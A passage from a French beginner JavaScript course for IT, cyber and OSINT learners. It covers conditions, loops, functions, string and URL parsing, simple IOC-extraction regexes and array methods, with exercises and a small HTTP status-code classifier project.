2. Calcule un booléen `estErreurClient` vrai si `code` est entre 400 et 499.
3. Affiche-le.
4. Refais le test avec `code = 200` et vérifie qu'il vaut `false`.

**Autonome**
Écris une expression booléenne qui vaut `true` si un `port` est **soit** 80 **soit** 443, **et** qu'une variable `estPublic` vaut `true`. Teste avec plusieurs valeurs.

**Défi**
Sans exécuter, prédis le résultat de chaque ligne, puis vérifie :
```javascript
console.log(1 == "1");
console.log(1 === "1");
console.log(null == undefined);
console.log(null === undefined);
console.log(Boolean("false"));
```
Explique en une phrase, pour chaque, pourquoi `==` et `===` diffèrent (ou non).

## ✅ Tu sais maintenant…

- utiliser les opérateurs arithmétiques, dont le modulo `%` ;
- distinguer `==` (lâche, à éviter) et `===` (strict, à utiliser), de même pour `!=` / `!==` ;
- citer les valeurs falsy (`false`, `0`, `""`, `null`, `undefined`, `NaN`) ;
- combiner des conditions avec `&&`, `||`, `!` ;
- diagnostiquer une condition au comportement surprenant.

-----

# Chapitre 5 — Conditions

## Le minimum à savoir

Une **condition** fait prendre une décision au code : exécuter un bloc **seulement si** quelque chose est vrai.

```javascript
const code = 404;

if (code === 200) {
  console.log("Succès");
} else if (code >= 400 && code < 500) {
  console.log("Erreur côté client");
} else if (code >= 500) {
  console.log("Erreur côté serveur");
} else {
  console.log("Autre code");
}
// Affiche : Erreur côté client
```

Structure :
- **`if (condition) { ... }`** : exécute le bloc si la condition est vraie.
- **`else if (autre) { ... }`** : testé seulement si les précédents sont faux.
- **`else { ... }`** : exécuté si rien d'autre n'a matché.

### Le ternaire : un `if/else` compact

Pour choisir entre **deux** valeurs, le ternaire est pratique :

```javascript
const code = 200;
const message = code === 200 ? "OK" : "Pas OK";
console.log(message);   // OK
```

Lecture : `condition ? valeurSiVrai : valeurSiFaux`.

### `switch` : tester une valeur contre plusieurs cas

Quand on compare **une même variable** à de nombreuses valeurs, `switch` est plus lisible :

```javascript
const methode = "POST";

switch (methode) {
  case "GET":
    console.log("Lecture de données");
    break;
  case "POST":
    console.log("Envoi de données");
    break;
  case "DELETE":
    console.log("Suppression");
    break;
  default:
    console.log("Méthode non gérée");
}
// Affiche : Envoi de données
```

> **N'oublie pas `break`** à la fin de chaque `case`, sinon l'exécution « déborde » sur le cas suivant (comportement rarement voulu).

## Très utile en pratique

Tester proprement `null` / `undefined` (rappel du chapitre 3) :

```javascript
let donnee;   // undefined

if (donnee === undefined) {
  console.log("Aucune donnée reçue");
}

// Astuce courante : tester l'absence de valeur "utile"
if (!donnee) {
  console.log("Donnée vide, nulle ou absente");
}
```

## Exemple simple

```javascript
const tentatives = 7;
const seuil = 5;

if (tentatives > seuil) {
  console.log(`⚠️ Alerte : ${tentatives} tentatives (seuil : ${seuil})`);
} else {
  console.log("Activité normale");
}
// ⚠️ Alerte : 7 tentatives (seuil : 5)
```

## Application IT / cyber / OSINT

Toute la logique de **triage** d'un SOC est faite de conditions. Classer un code HTTP, décider si une IP est privée ou publique, déclencher une alerte au-delà d'un seuil, router un événement selon sa méthode HTTP : ce sont des `if/else` et des `switch`. Plus tu écris des conditions claires, plus ta logique de détection est lisible et maintenable.

## ❌ Erreur classique

```javascript
// ❌ Un seul = (affectation) au lieu de === (comparaison)
let actif = false;
if (actif = true) {       // ⚠️ assigne true, puis teste true → toujours vrai !
  console.log("Toujours exécuté, bug silencieux");
}

// ✅ CORRECT : comparaison stricte
if (actif === true) { ... }

// ❌ Oublier le break dans un switch
switch (x) {
  case 1:
    console.log("un");   // sans break, "deux" s'affiche aussi
  case 2:
    console.log("deux");
}
```

> **Réflexe diagnostic :** une condition « toujours vraie » sans raison ? Vérifie que tu as bien `===` et non un seul `=` (qui est une **affectation**, pas une comparaison).

## Exercices

**Guidé**
1. Crée `const code = 503`.
2. Avec `if / else if / else`, affiche `"client"` pour 4xx, `"serveur"` pour 5xx, `"autre"` sinon.
3. Vérifie avec `code = 404` puis `code = 200`.

**Autonome**
Écris un `switch` sur une variable `protocole` (`"HTTP"`, `"HTTPS"`, `"SSH"`, `"RDP"`) qui affiche le port standard correspondant (80, 443, 22, 3389), et un message par défaut pour les autres.

**Défi**
Écris une fonction de classification d'IP **sans fonction encore** (juste avec des conditions, on fera les fonctions au chapitre suivant) : à partir d'une `const ip = "192.168.1.10"`, affiche `"privée"` si elle commence par `"192.168."`, `"10."`, ou `"172.16."`, sinon `"publique"`. *(Indice : `ip.startsWith("192.168.")`.)*

## ✅ Tu sais maintenant…

- écrire des `if` / `else if` / `else` ;
- utiliser le ternaire pour choisir entre deux valeurs ;
- utiliser `switch` avec `break` et `default` ;
- tester l'absence de valeur (`undefined`, falsy) ;
- éviter le piège du `=` (affectation) au lieu de `===` (comparaison).

-----

# Chapitre 6 — Boucles

## Le minimum à savoir

Une **boucle** répète un bloc de code. C'est essentiel pour traiter des collections : lignes de log, listes d'IP, entrées JSON.

### La boucle `for` classique

```javascript
for (let i = 0; i < 5; i++) {
  console.log(`Itération ${i}`);
}
// Itération 0, 1, 2, 3, 4
```

Trois parties entre parenthèses :
- **`let i = 0`** : initialisation (point de départ) ;
- **`i < 5`** : condition de continuation (tant qu'elle est vraie, on répète) ;
- **`i++`** : incrément (exécuté après chaque tour ; `i++` veut dire `i = i + 1`).

### La boucle `for...of` : parcourir une collection

C'est la plus lisible pour parcourir un tableau (qu'on détaillera au chapitre 10) :

```javascript
const ips = ["10.0.0.1", "8.8.8.8", "192.168.1.1"];

for (const ip of ips) {
  console.log(`IP analysée : ${ip}`);
}
```

### La boucle `while`

Répète **tant qu'**une condition est vraie. Utile quand on ne sait pas d'avance combien de tours :

```javascript
let tentatives = 0;

while (tentatives < 3) {
  console.log(`Tentative ${tentatives + 1}`);
  tentatives++;
}
```

### `break` et `continue`

```javascript
for (const ip of ["8.8.8.8", "0.0.0.0", "1.1.1.1"]) {
  if (ip === "0.0.0.0") {
    continue;   // saute CET élément, passe au suivant
  }
  if (ip === "1.1.1.1") {
    break;      // ARRÊTE complètement la boucle
  }
  console.log(`Traitée : ${ip}`);
}
// Traitée : 8.8.8.8
```

## Très utile en pratique

Compter des éléments qui remplissent une condition — un classique du parsing :

```javascript
const codes = [200, 404, 200, 500, 404, 403];
let nbErreurs = 0;

for (const code of codes) {
  if (code >= 400) {
    nbErreurs++;
  }
}

console.log(`Nombre d'erreurs : ${nbErreurs}`);   // Nombre d'erreurs : 4
```

## Exemple simple

```javascript
const ports = [22, 80, 443, 3389];

for (const port of ports) {
  const securise = port === 443 || port === 22;
  console.log(`Port ${port} → chiffré : ${securise}`);
}
```

Sortie :

```text
Port 22 → chiffré : true
Port 80 → chiffré : false
Port 443 → chiffré : true
Port 3389 → chiffré : false
```

## Application IT / cyber / OSINT

Parcourir une collection est **le geste fondamental** du scripting défensif : itérer sur les lignes d'un fichier de logs, sur une liste d'IOC, sur les entrées d'une réponse JSON d'API. Compter, filtrer, transformer pendant le parcours — c'est exactement ce que fait un parser de logs (le mini-projet de la Partie 2). En Partie 6, ces mêmes boucles s'appliqueront à des fichiers réels lus avec Node.js, et tu retrouveras la logique du cours Python.

## ❌ Erreur classique

```javascript
// ❌ Boucle infinie : on oublie de faire progresser la condition
let i = 0;
while (i < 5) {
  console.log(i);
  // on a oublié i++  → i reste 0 → boucle infinie, l'onglet se fige !
}

// ❌ Confondre for...of (valeurs) et for...in (clés/index)
const arr = ["a", "b", "c"];
for (const x of arr) console.log(x);   // a, b, c   ← les VALEURS (ce qu'on veut)
for (const x in arr) console.log(x);   // 0, 1, 2   ← les INDEX (souvent pas voulu)
```

> ### ⚠️ À ne pas confondre : `for...of` vs `for...in`
> - **`for...of`** parcourt les **valeurs** d'un tableau → c'est ce que tu veux 95 % du temps.
> - **`for...in`** parcourt les **clés/index** → réservé aux objets, piégeux sur les tableaux.
>
> Règle de débutant : sur un tableau, utilise **`for...of`**.

> **Réflexe diagnostic :** ton onglet se fige ? Tu as probablement une **boucle infinie** : vérifie que la condition finit par devenir fausse (compteur incrémenté, etc.). Ferme l'onglet pour reprendre la main.

## Exercices

**Guidé**
1. Crée `const codes = [200, 301, 404, 500, 200]`.
2. Avec `for...of`, affiche chaque code et s'il s'agit d'une erreur (`>= 400`).
3. Compte le nombre total d'erreurs et affiche-le à la fin.

**Autonome**
À partir d'un tableau d'IP `["10.0.0.1", "8.8.8.8", "192.168.0.5", "1.1.1.1"]`, parcours-le et affiche pour chacune `"privée"` ou `"publique"` (réutilise ta logique du chapitre 5).

**Défi**
Parcours les nombres de 1 à 50. Pour chaque multiple de 5 (`n % 5 === 0`), affiche le nombre. Utilise `continue` pour sauter les autres. Compte combien tu en as affichés et vérifie le total.

## ✅ Tu sais maintenant…

- écrire une boucle `for` classique (init ; condition ; incrément) ;
- parcourir une collection avec `for...of` ;
- utiliser `while` quand le nombre de tours est inconnu ;
- contrôler le flux avec `break` et `continue` ;
- éviter les boucles infinies et le piège `for...in` sur un tableau.

-----

## 🧩 Mini-projet — Classificateur de codes HTTP (chapitres 1 à 6)

Rassemble tout ce que tu as appris dans la Partie 1. Crée un fichier `classificateur.js` relié à une page `index.html` (chapitre 2), ou teste directement en console.

**Objectif :** à partir d'une liste de codes HTTP, afficher pour chacun sa catégorie, et un récapitulatif du nombre d'erreurs.

```javascript
// classificateur.js
const codes = [200, 301, 404, 403, 500, 200, 503, 204];

let nbSucces = 0;
let nbRedirections = 0;
let nbErreursClient = 0;
let nbErreursServeur = 0;

for (const code of codes) {
  let categorie;

  if (code >= 200 && code < 300) {
    categorie = "Succès";
    nbSucces++;
  } else if (code >= 300 && code < 400) {
    categorie = "Redirection";
    nbRedirections++;
  } else if (code >= 400 && code < 500) {
    categorie = "Erreur client";
    nbErreursClient++;
  } else if (code >= 500 && code < 600) {
    categorie = "Erreur serveur";
    nbErreursServeur++;
  } else {
    categorie = "Inconnu";
  }

  console.log(`${code} → ${categorie}`);
}

console.log("---");
console.log(`Succès : ${nbSucces}`);
console.log(`Redirections : ${nbRedirections}`);
console.log(`Erreurs client : ${nbErreursClient}`);
console.log(`Erreurs serveur : ${nbErreursServeur}`);

const totalErreurs = nbErreursClient + nbErreursServeur;
console.log(`⚠️ Total erreurs : ${totalErreurs}`);
```

Sortie attendue :

```text
200 → Succès
301 → Redirection
404 → Erreur client
403 → Erreur client
500 → Erreur serveur
200 → Succès
503 → Erreur serveur
204 → Succès
---
Succès : 3
Redirections : 1
Erreurs client : 2
Erreurs serveur : 2
⚠️ Total erreurs : 4
```

**Pour aller plus loin (optionnel) :** ajoute un code « bizarre » comme `999` et vérifie qu'il tombe dans `"Inconnu"`. Change la liste et observe le récapitulatif s'adapter.

Ce mini-projet mobilise : variables (`const`/`let`), types, comparaisons strictes (`===`, `>=`), conditions (`if/else if/else`), boucle (`for...of`), compteurs, et template strings. C'est exactement la mécanique d'un **premier outil de triage**.

-----

## ✅ CHECKPOINT 1 — Tu maîtrises le langage de base

Avant de passer à la Partie 2, assure-toi de pouvoir, **sans regarder** :

- [ ] expliquer la différence HTML / CSS / JavaScript et navigateur / Node.js ;
- [ ] ouvrir la console et exécuter du JavaScript ;
- [ ] créer une page minimale `index.html` + `script.js` reliés ;
- [ ] déclarer des variables avec `const`/`let` et nommer les types de base ;
- [ ] écrire une template string ;
- [ ] utiliser `===` plutôt que `==` et expliquer pourquoi ;
- [ ] citer les valeurs falsy ;
- [ ] écrire un `if/else if/else`, un ternaire, un `switch` ;
- [ ] écrire une boucle `for...of` et compter des éléments sous condition ;
- [ ] réaliser le mini-projet classificateur de codes HTTP.

Si un point te résiste, reviens au chapitre concerné avant de continuer. La Partie 2 (fonctions, tableaux, objets, JSON) s'appuie entièrement sur ces fondations.

-----

*Fin de la Partie 1. La Partie 2 — « Structurer les données et le code » sera rédigée après ta validation de ce premier bloc.*

-----

# Chapitre 7 — Fonctions

## Le minimum à savoir

Une **fonction** est un bloc de code réutilisable auquel on donne un nom. Au lieu de réécrire la même logique partout, tu l'écris une fois et tu l'appelles autant que tu veux.

```javascript
// Déclaration d'une fonction
function saluer(nom) {
  return `Bonjour, ${nom}`;
}

// Appel de la fonction
console.log(saluer("admin"));   // Bonjour, admin
console.log(saluer("analyste")); // Bonjour, analyste
```

Vocabulaire :
- **`nom`** entre parenthèses est un **paramètre** : une donnée d'entrée.
- **`return`** renvoie un résultat à celui qui a appelé la fonction.
- `"admin"` lors de l'appel est un **argument** : la valeur réelle passée.

### `return` : renvoyer vs afficher

Ne confonds pas `return` (renvoie une valeur réutilisable) et `console.log` (affiche seulement).

```javascript
function doubler(n) {
  return n * 2;        // renvoie, n'affiche rien
}

const resultat = doubler(21);   // on récupère la valeur
console.log(resultat);          // 42
```

Une fonction sans `return` renvoie `undefined`.

### Fonctions fléchées (arrow functions)

JavaScript propose une syntaxe plus courte, très fréquente dans le code moderne : la **fonction fléchée**.

```javascript
// Fonction classique
function carre(n) {
  return n * n;
}

// Même chose en fonction fléchée
const carre2 = (n) => {
  return n * n;
};

// Version ultra-courte : si le corps est un seul return, on peut tout enlever
const carre3 = (n) => n * n;

console.log(carre(5), carre2(5), carre3(5));   // 25 25 25
```

> ### ⚠️ À ne pas confondre : fonction classique vs fléchée
> Pour un débutant, **les deux font la même chose dans 95 % des cas**. La fléchée est juste plus courte. Tu la verras surtout avec `map`, `filter`, `addEventListener` (chapitres suivants). Il existe une différence subtile sur le mot-clé `this` (voir Annexe A), mais elle ne te concerne pas encore. Utilise celle qui te paraît la plus lisible.

### Paramètres par défaut

```javascript
function connexion(port = 443) {
  return `Connexion sur le port ${port}`;
}

console.log(connexion());      // Connexion sur le port 443 (valeur par défaut)
console.log(connexion(8080));  // Connexion sur le port 8080
```

## Très utile en pratique

Une fonction de test réutilisable, qui renvoie un booléen :

```javascript
function estIpPrivee(ip) {
  return ip.startsWith("10.") ||
         ip.startsWith("192.168.") ||
         ip.startsWith("172.16.");
}

console.log(estIpPrivee("192.168.1.10"));  // true
console.log(estIpPrivee("8.8.8.8"));       // false
```

Maintenant que la logique est dans une fonction, tu peux la réutiliser partout sans la réécrire.

## Exemple simple

```javascript
function classerCode(code) {
  if (code >= 200 && code < 300) return "Succès";
  if (code >= 300 && code < 400) return "Redirection";
  if (code >= 400 && code < 500) return "Erreur client";
  if (code >= 500) return "Erreur serveur";
  return "Inconnu";
}

console.log(classerCode(404));   // Erreur client
console.log(classerCode(200));   // Succès
```

## Application IT / cyber / OSINT

Les fonctions sont la base de tout outil défensif réutilisable. Tu vas écrire des fonctions comme `estIpPrivee(ip)`, `extraireDomaine(url)`, `estHashValide(h)`, `classerAlerte(event)`. Chacune encapsule une règle métier que tu réutilises dans tes parsers, tes scripts de triage et tes mini-outils OSINT. Une fonction bien nommée rend ton code **lisible** : `if (estIpPrivee(ip))` se lit comme une phrase.

> ### 🔍 Lecture de code inconnu (exercice récurrent)
> À partir de ce chapitre, prends l'habitude, face à un script JavaScript trouvé dans une page, de **repérer les fonctions** : leur nom révèle souvent l'intention du code (`sendData`, `getToken`, `validate`…). On approfondira cette compétence au chapitre 33.

## ❌ Erreur classique

```javascript
// ❌ Oublier le return : la fonction calcule mais ne renvoie rien
function additionner(a, b) {
  a + b;          // calculé mais jeté !
}
console.log(additionner(2, 3));   // undefined

// ✅ CORRECT
function additionner2(a, b) {
  return a + b;
}
console.log(additionner2(2, 3));   // 5

// ❌ Appeler une fonction sans les parenthèses
console.log(additionner2);    // affiche le code de la fonction, ne l'exécute pas !
console.log(additionner2(2, 3)); // ✅ avec parenthèses : l'exécute
```

> **Réflexe diagnostic :** ta fonction renvoie `undefined` ? Tu as très probablement oublié le `return`.

## Exercices

**Guidé**
1. Écris une fonction `estPortSecurise(port)` qui renvoie `true` si le port est 22 ou 443, sinon `false`.
2. Teste-la avec 22, 80, 443, 3389.

**Autonome**
Écris une fonction `categorieCode(code)` qui renvoie la catégorie d'un code HTTP (réutilise la logique du mini-projet du checkpoint 1, mais sous forme de fonction renvoyant une string).

**Défi**
Écris une fonction `normaliserIp(ip)` qui prend une IP éventuellement entourée d'espaces et en majuscules inutiles (ex. `"  8.8.8.8  "`), et renvoie la version nettoyée (`.trim()`). Puis écris une seconde fonction qui utilise la première **et** `estIpPrivee` pour afficher `"privée"` ou `"publique"` proprement.

## ✅ Tu sais maintenant…

- déclarer une fonction avec `function`, des paramètres et un `return` ;
- distinguer `return` (renvoie) et `console.log` (affiche) ;
- écrire une fonction fléchée et comprendre qu'elle équivaut souvent à la classique ;
- utiliser des paramètres par défaut ;
- encapsuler une règle métier dans une fonction réutilisable.

-----

# Chapitre 8 — Chaînes de caractères et l'objet `URL`

## Le minimum à savoir

Le **texte** (string) est ce que tu manipules le plus en cyber et en OSINT : logs, IP, domaines, URLs, hash. JavaScript offre de nombreuses méthodes pour le traiter.

### Propriétés et accès

```javascript
const texte = "192.168.1.1";
console.log(texte.length);     // 11  (nombre de caractères)
console.log(texte[0]);         // "1" (premier caractère)
```

> Les chaînes sont **immuables** : une méthode ne modifie jamais la chaîne d'origine, elle en **renvoie une nouvelle**. Il faut donc récupérer le résultat.

### Méthodes essentielles

```javascript
const brut = "  Admin@Example.COM  ";

console.log(brut.trim());            // "Admin@Example.COM"  (enlève les espaces aux bouts)
console.log(brut.trim().toLowerCase()); // "admin@example.com"
console.log("HELLO".toUpperCase());  // "HELLO"

const email = "admin@example.com";
console.log(email.includes("@"));    // true   (contient ?)
console.log(email.startsWith("admin")); // true
console.log(email.endsWith(".com"));    // true
console.log(email.indexOf("@"));     // 5      (position, ou -1 si absent)
console.log(email.replace("admin", "user")); // "user@example.com"
console.log(email.slice(0, 5));      // "admin" (extrait du caractère 0 à 4)
```

### `split` et `join` : découper et recoller

`split` transforme une chaîne en **tableau**, `join` fait l'inverse. Indispensables pour le parsing.

```javascript
const ligne = "8.8.8.8,google,53";
const champs = ligne.split(",");
console.log(champs);          // ["8.8.8.8", "google", "53"]
console.log(champs[0]);       // "8.8.8.8"

const ip = "192.168.1.1";
const octets = ip.split(".");
console.log(octets);          // ["192", "168", "1", "1"]
console.log(octets.length);   // 4

// join : recoller un tableau en chaîne
console.log(octets.join("-")); // "192-168-1-1"
```

### Les template strings (rappel)

```javascript
const host = "srv01";
const ip = "10.0.0.5";
console.log(`Hôte ${host} → ${ip}`);   // Hôte srv01 → 10.0.0.5
```

## Très utile en pratique : l'objet `URL`

Pour analyser une URL, **n'utilise pas `split` à la main** : c'est fragile et plein de cas particuliers. JavaScript fournit un objet natif **`URL`** qui fait le travail proprement.

```javascript
const u = new URL("https://example.com:8443/login?user=admin&lang=fr#section");

console.log(u.protocol);   // "https:"
console.log(u.hostname);   // "example.com"
console.log(u.port);       // "8443"
console.log(u.pathname);   // "/login"
console.log(u.search);     // "?user=admin&lang=fr"
console.log(u.hash);       // "#section"

// Lire les paramètres de requête proprement
console.log(u.searchParams.get("user"));  // "admin"
console.log(u.searchParams.get("lang"));   // "fr"
```

C'est bien plus fiable que de découper la chaîne soi-même : l'objet `URL` gère les ports, les paramètres, l'encodage, les cas tordus.

> ### ⚠️ À ne pas confondre : parsing manuel vs objet `URL`
> Découper une URL avec `split("/")` ou `split("?")` marche sur les cas simples mais **casse** dès qu'une URL est un peu inhabituelle. Pour extraire un domaine ou un paramètre, **utilise `new URL(...)`**. On le réutilisera avec `fetch` en Partie 5.

## Exemple simple

```javascript
function extraireDomaine(url) {
  return new URL(url).hostname;
}

console.log(extraireDomaine("https://www.example.com/path?x=1"));  // "www.example.com"
console.log(extraireDomaine("http://malveillant.test:8080/c2"));   // "malveillant.test"
```

## Application IT / cyber / OSINT

La manipulation de chaînes est le cœur de l'analyse défensive. Tu vas constamment : **normaliser** un IOC (`trim` + `toLowerCase` pour comparer des emails ou domaines sans casse), **découper** des lignes de log avec `split`, **extraire** un domaine ou un paramètre d'URL suspecte avec l'objet `URL`, **filtrer** des chaînes avec `includes` ou `startsWith`.

Exemple concret : pour comparer deux domaines en OSINT, il faut d'abord les normaliser (`"Example.COM"` et `"example.com"` sont le même domaine). Un oubli de normalisation fausse tous tes regroupements.

## ❌ Erreur classique

```javascript
// ❌ Croire qu'une méthode modifie la chaîne d'origine
let nom = "  admin  ";
nom.trim();              // renvoie "admin" mais ne modifie PAS nom
console.log(nom);        // "  admin  "  ← inchangé !

// ✅ CORRECT : récupérer le résultat
nom = nom.trim();
console.log(nom);        // "admin"

// ❌ Parser une URL à la main et se tromper
const url = "https://example.com:8443/path";
console.log(url.split("/")[2]);   // "example.com:8443"  ← le port est collé !

// ✅ CORRECT : utiliser URL
console.log(new URL(url).hostname);  // "example.com"
```

> **Réflexe diagnostic :** une transformation de texte « ne marche pas » ? Vérifie que tu **récupères** bien le résultat (`x = x.trim()`), car les chaînes sont immuables.

## Exercices

**Guidé**
1. À partir de `const brut = "  USER@Domain.COM  "`, produis la version normalisée en minuscules sans espaces.
2. Vérifie qu'elle contient `"@"`.
3. Extrais la partie après le `@` avec `split("@")`.

**Autonome**
Écris une fonction `extraireParam(url, nom)` qui renvoie la valeur d'un paramètre de requête d'une URL (utilise `new URL` et `searchParams.get`). Teste-la sur `"https://site.test/page?id=42&debug=true"` avec `"id"` puis `"debug"`.

**Défi**
À partir d'une ligne de log CSV `"2024-01-15,8.8.8.8,GET,/admin,403"`, découpe-la avec `split(",")`, et affiche une phrase lisible : `Le 2024-01-15, l'IP 8.8.8.8 a fait un GET sur /admin → 403`. Utilise une template string et les éléments du tableau.

## ✅ Tu sais maintenant…

- accéder à la longueur et aux caractères d'une chaîne ;
- comprendre que les chaînes sont immuables (récupérer le résultat) ;
- utiliser `trim`, `toLowerCase`, `toUpperCase`, `includes`, `startsWith`, `endsWith`, `replace`, `slice`, `indexOf` ;
- découper et recoller avec `split` et `join` ;
- parser une URL proprement avec `new URL(...)` et `searchParams`.

-----

# Chapitre 9 — Regex simples pour OSINT / SOC

> **Chapitre court.** On reste volontairement sur les bases. Les regex avancées (groupes nommés, lookahead…) ne sont pas nécessaires ici. L'objectif : savoir **extraire** des IOC d'un texte.

## Le minimum à savoir

Une **expression régulière** (regex) est un motif qui décrit une forme de texte. En JavaScript, une regex s'écrit entre slashes : `/motif/`.

```javascript
const texte = "Connexion depuis 8.8.8.8 vers le port 443";

// Tester si un motif existe
console.log(/\d+/.test(texte));   // true  (contient au moins un chiffre)
```

### Les briques de base

| Motif | Signifie | Exemple |
| --- | --- | --- |
| `\d` | un chiffre (0-9) | `\d\d\d` → 3 chiffres |
| `\w` | un caractère de mot (lettre, chiffre, `_`) | |
| `.` | n'importe quel caractère | |
| `+` | « un ou plusieurs » du motif précédent | `\d+` → 1+ chiffres |
| `*` | « zéro ou plusieurs » | |
| `{n}` | exactement n fois | `\d{1,3}` → 1 à 3 chiffres |
| `[abc]` | un caractère parmi a, b, c | `[0-9]` = `\d` |
| `\.` | un vrai point (échappé) | dans une IP |
| `g` | drapeau « global » : toutes les occurrences | `/\d+/g` |
| `i` | drapeau « insensible à la casse » | |

### Extraire avec `match`

```javascript
const log = "IP source 192.168.1.10, IP dest 8.8.8.8";

// Motif simplifié d'IPv4 : 1 à 3 chiffres, un point, ... 4 fois
const motifIp = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;

const ips = log.match(motifIp);
console.log(ips);   // ["192.168.1.10", "8.8.8.8"]
```

Sans le drapeau `g`, `match` ne renvoie que la **première** occurrence. Avec `g`, il renvoie **toutes** les occurrences dans un tableau (ou `null` si aucune).

## Très utile en pratique : motifs d'IOC courants

```javascript
// IPv4 (version simple, suffisante pour extraire d'un texte)
const reIp = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;

// Email (version simple)
const reEmail = /[\w.+-]+@[\w-]+\.[\w.-]+/g;

// Hash MD5 (32 caractères hexadécimaux)
const reMd5 = /\b[a-f0-9]{32}\b/gi;

// Hash SHA-256 (64 caractères hexadécimaux)
const reSha256 = /\b[a-f0-9]{64}\b/gi;
```

> Ces motifs sont **volontairement simples** : ils servent à **extraire des candidats** d'un texte, pas à valider strictement. Une validation rigoureuse (IP entre 0 et 255, etc.) se fait ensuite avec des conditions ou des objets dédiés.

## Exemple simple

```javascript
const rapport = `
Alerte: connexion de admin@corp.test
depuis 203.0.113.45 et 8.8.8.8
fichier suspect: d41d8cd98f00b204e9800998ecf8427e
`;

const ips = rapport.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g);
const emails = rapport.match(/[\w.+-]+@[\w-]+\.[\w.-]+/g);
const md5 = rapport.match(/\b[a-f0-9]{32}\b/gi);

console.log("IPs :", ips);       // ["203.0.113.45", "8.8.8.8"]
console.log("Emails :", emails); // ["admin@corp.test"]
console.log("MD5 :", md5);       // ["d41d8cd98f00b204e9800998ecf8427e"]
```

## Application IT / cyber / OSINT

C'est exactement le geste d'un analyste : **extraire les IOC** d'un bloc de texte (rapport, log, email d'alerte). En quelques lignes, tu récupères toutes les IP, emails et hash d'un document. Combiné aux méthodes de tableaux du chapitre suivant (dédoublonnage avec un `Set`, filtrage), tu obtiens un mini-extracteur d'IOC — un classique du cours Python, transposé en JavaScript.

> ### 🔍 Lecture de code inconnu
> Dans un script inconnu, une regex révèle souvent **ce que le code cherche** : un motif d'email, de carte bancaire, de token. Repérer les regex t'aide à comprendre l'intention.

## ❌ Erreur classique

```javascript
// ❌ Oublier le drapeau g : on ne récupère que la première occurrence
const log = "8.8.8.8 et 1.1.1.1";
console.log(log.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/));   // ["8.8.8.8", ...] une seule

// ✅ Avec g : toutes
console.log(log.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g));  // ["8.8.8.8", "1.1.1.1"]

// ❌ Oublier d'échapper le point : . veut dire "n'importe quel caractère"
console.log(/8.8.8.8/.test("8X8X8X8"));   // true  ← pas ce qu'on veut !

// ✅ Échapper avec \.
console.log(/8\.8\.8\.8/.test("8X8X8X8")); // false
```

> **Réflexe diagnostic :** `match` renvoie `null` ? Le motif ne correspond à rien. Teste ton motif progressivement, et vérifie le drapeau `g`.

## Exercices

**Guidé**
1. À partir du texte `"erreurs sur 10.0.0.1 et 10.0.0.2 et 8.8.8.8"`, extrais toutes les IP avec une regex et le drapeau `g`.
2. Affiche le tableau et son `.length`.

**Autonome**
Écris une fonction `extraireEmails(texte)` qui renvoie tous les emails d'un texte (ou un tableau vide si aucun — attention, `match` renvoie `null`, pense à gérer ce cas avec `|| []`).

**Défi**
À partir d'un texte mêlant MD5 (32 hex) et SHA-256 (64 hex), extrais séparément les deux types de hash avec deux regex distinctes, et affiche combien il y en a de chaque. *(Indice : `\b...\b` et la longueur exacte avec `{32}` ou `{64}`.)*

## ✅ Tu sais maintenant…

- écrire une regex simple entre `/.../` ;
- utiliser `\d`, `\w`, `.`, `+`, `{n}`, `[...]`, et échapper avec `\.` ;
- tester avec `.test()` et extraire avec `.match()` ;
- utiliser les drapeaux `g` (global) et `i` (insensible à la casse) ;
- extraire des IOC simples (IP, emails, hash) d'un texte.

-----

# Chapitre 10 — Tableaux et méthodes utiles

## Le minimum à savoir

Un **tableau** (array) est une collection ordonnée de valeurs.

```javascript
const ips = ["8.8.8.8", "1.1.1.1", "192.168.1.1"];

console.log(ips[0]);        // "8.8.8.8"  (premier, index 0)
console.log(ips.length);    // 3
console.log(ips[ips.length - 1]); // "192.168.1.1" (dernier)
```

### Ajouter et retirer

```javascript
const liste = [];
liste.push("a");       // ajoute à la fin → ["a"]
liste.push("b");       // ["a", "b"]
liste.pop();           // retire le dernier → ["a"]
console.log(liste);    // ["a"]
```

### Parcourir (rappel)

```javascript
const ports = [22, 80, 443];
for (const port of ports) {
  console.log(port);
}
```

## Très utile en pratique : `map`, `filter`, `find`

Ces trois méthodes transforment un tableau sans boucle explicite. **Elles sont au cœur du JavaScript moderne.** Chacune prend une fonction (souvent fléchée) appliquée à chaque élément.

### `filter` — garder seulement certains éléments

```javascript
const codes = [200, 404, 301, 500, 403];

const erreurs = codes.filter((code) => code >= 400);
console.log(erreurs);   // [404, 500, 403]
```

Lecture : « garde les éléments pour lesquels la fonction renvoie `true` ».

### `map` — transformer chaque élément

```javascript
const ips = ["8.8.8.8", "1.1.1.1"];

const enMajuscules = ips.map((ip) => `IP: ${ip}`);
console.log(enMajuscules);   // ["IP: 8.8.8.8", "IP: 1.1.1.1"]
```

Lecture : « renvoie un nouveau tableau où chaque élément est transformé ».

### `find` — trouver le premier qui correspond

```javascript
const codes = [200, 404, 500];

const premiereErreur = codes.find((code) => code >= 400);
console.log(premiereErreur);   // 404  (le premier, pas tous)
```

`find` renvoie l'**élément** (ou `undefined` si aucun). À ne pas confondre avec `filter` qui renvoie un **tableau**.

### `includes` — l'élément est-il présent ?

```javascript
const ipsBloquees = ["8.8.8.8", "1.1.1.1"];
console.log(ipsBloquees.includes("8.8.8.8"));   // true
console.log(ipsBloquees.includes("9.9.9.9"));   // false
```

### Enchaîner les méthodes

La vraie puissance vient de l'enchaînement :

```javascript
const codes = [200, 404, 301, 500, 403, 502];

const messagesErreurs = codes
  .filter((c) => c >= 400)        // garde les erreurs → [404, 500, 403, 502]
  .map((c) => `Erreur ${c}`);     // transforme → ["Erreur 404", ...]

console.log(messagesErreurs);
// ["Erreur 404", "Erreur 500", "Erreur 403", "Erreur 502"]
```

### Dédoublonner avec `Set`

```javascript
const ips = ["8.8.8.8", "1.1.1.1", "8.8.8.8", "8.8.8.8"];
const uniques = [...new Set(ips)];
console.log(uniques);   // ["8.8.8.8", "1.1.1.1"]
```

## Exemple simple

```javascript
const ips = ["10.0.0.1", "8.8.8.8", "192.168.1.5", "1.1.1.1"];

function estIpPrivee(ip) {
  return ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.");
}

const publiques = ips.filter((ip) => !estIpPrivee(ip));
